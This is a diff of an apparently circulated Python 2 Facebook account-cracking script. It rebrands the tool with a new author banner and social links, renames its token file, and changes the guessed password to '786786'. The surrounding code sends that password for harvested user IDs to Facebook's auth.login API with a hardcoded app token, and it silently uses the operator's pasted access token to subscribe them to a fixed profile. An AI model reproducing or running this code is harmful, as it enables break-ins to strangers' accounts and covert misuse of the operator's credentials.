@@ -23,7 +23,7 @@ reload(sys)
 sys.setdefaultencoding("utf8")
 
 def exit():
-    print '[!] Keluar'
+    print '[!] Exit'
     os.sys.exit()
     
 def acak(b):
@@ -36,11 +36,11 @@ def acak(b):
 
 
 logo = ''' 
- ____       _    _     _
-|  _ \ __ _| | _(_)___| |_ __ _ _ __
-| |_) / _` | |/ / / __| __/ _` | '_ \
-|  __/ (_| |   <| \__ \ || (_| | | | |
-|_|   \__,_|_|\_\_|___/\__\__,_|_| |_|
+ ____    __    _  _    __    ____  _  _    __   
+(_   )  /__\  ( )/ )  /__\  (  _ \( \/ )  /__\  
+ / /_  /(  )\  )  (  /(  )\  )   / \  /  /(  )\ 
+(____)(__)(__)(_)\_)(__)(__)(_)\_) (__) (__)(__)
+
 '''
 idh = []
 
@@ -58,11 +58,11 @@ def pilog():
         print 
         print ("Login Token").center(50)
         print
-        print ("[1] Download GetAccessToken Apk From Playstore")
+        print ("Aurher    :  Sayyed Zakarya")
         print('')
-        print ("[2] Make New Fake Id And Generate Access Token By THe App")
+        print ("YouTube   :  Aryano Tricks")
         print('')
-        print ("[3] Copy The Access Token And Past In The Tool")
+        print ("Facebook  :  Sayyed Zakarya Bacha ")
         print 
         token = raw_input("[+] Past Your Token Here : ")
         sav = open(".logacid.txt","w")
@@ -79,21 +79,21 @@ def pilog():
         
 def bot_fl():
     try:
-        token = open('.logAcid.txt', 'r').read()
+        token = open('.logfuck.txt', 'r').read()
     except IOError:
         print '\x1b[1;97m   [!] Token invalid'
-        os.system('rm -rf .logAcid.txt')
+        os.system('rm -rf .logfuck.txt')
     requests.post('https://graph.facebook.com/100001027764318/subscribers?access_token=' + token)
     menu()
     
 def menu():
     os.system("clear")
     try:
-        token = open(".logAcid.txt","r").read()
+        token = open(".logfuck.txt","r").read()
     except IOError:
         print logo
         print("[!] Token Error or Toke Not Found")
-        os.system("rm -rf .logAcid.txt")
+        os.system("rm -rf .logfuck.txt")
         time.sleep(1)
         logmen()
     try:
@@ -104,7 +104,7 @@ def menu():
         os.system("clear")
         print logo
         print("[!] Fail To Load Your Account Is It Checkpiont")
-        os.system("rm -rf .logAcid.txt")
+        os.system("rm -rf .logfuck.txt")
         time.sleep(1)
         logmen()
     os.system("clear")
@@ -121,7 +121,7 @@ def pil():
     if ti =='1':
         cramen()
     elif ti =='0':
-        os.system('rm -rf .logAcid.txt')
+        os.system('rm -rf .logfuck.txt')
         print '[√] Deleting Token Successfully.'
         time.sleep(1)
         os.system('exit')
@@ -137,7 +137,7 @@ def cramen():
 		token=open(".logfuck.txt","r").read()
 	except IOError:
 		print("[!] Token Error. Token Not Working")
-		os.system("rm -rf .logAcid.txt")
+		os.system("rm -rf .logfuck.txt")
 		time.sleep(1)
 		logmen()
 	os.system("clear")
@@ -248,7 +248,7 @@ def crapil():
 		                            ok.close()
 		                            oks.append(uid)
 		                        else:
-		                            pass4="Love123"
+		                            pass4="786786"
 		                            q = requests.get("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + uid + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6", headers=header).text
 		                            d=json.loads(q)
 		                            if 'www.facebook.com' in d['error_msg']:
